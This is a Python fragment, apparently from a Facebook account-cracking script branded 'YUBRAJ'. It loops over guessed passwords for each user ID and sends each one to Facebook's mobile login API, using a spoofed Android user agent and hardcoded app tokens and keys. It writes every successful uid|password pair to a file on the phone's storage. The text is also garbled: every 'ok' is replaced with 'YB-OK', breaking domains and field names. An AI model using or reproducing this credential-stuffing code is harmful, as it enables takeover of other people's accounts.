...
def file_subb(uid,pwx):
    global OKs,loop,cps
    sys.stdout.write(f"\r  \033[38;5;46m[YUBRAJ] {loop}|{str(len(YB-OKs))}");sys.stdout.flush()
    session=requests.Session()
    try:
        for ps in pwx:
            user_agent="Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.faceboYB-OK.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]"
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            ...
            "email": uid,
            "password": ps,
            "access_tYB-OKen": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_coYB-OKies": "1",
            "meta_inf_fbmeta": "",
            ...
            "fb_api_caller_class": "com.faceboYB-OK.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {
            'User-Agent': user_agent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.faceboYB-OK.com',
            ...
            'X-fb-connection-tYB-OKen': 'd29d67d37eca387482a8a5b740f84f62',}
            p = requests.post("https://b-graph.faceboYB-OK.com/auth/login",data=data,headers=headers,allow_redirects=False).text
            q=json.loads(p)
            if "session_key" in q:
                print(f"\r\r  [YB-OK] {uid} | {ps}      ")
                open("/sdcard/YUBRAJ-YB-OK.txt","a").write(uid+"|"+ps+"\n")
                YB-OKs.append(uid)
                break
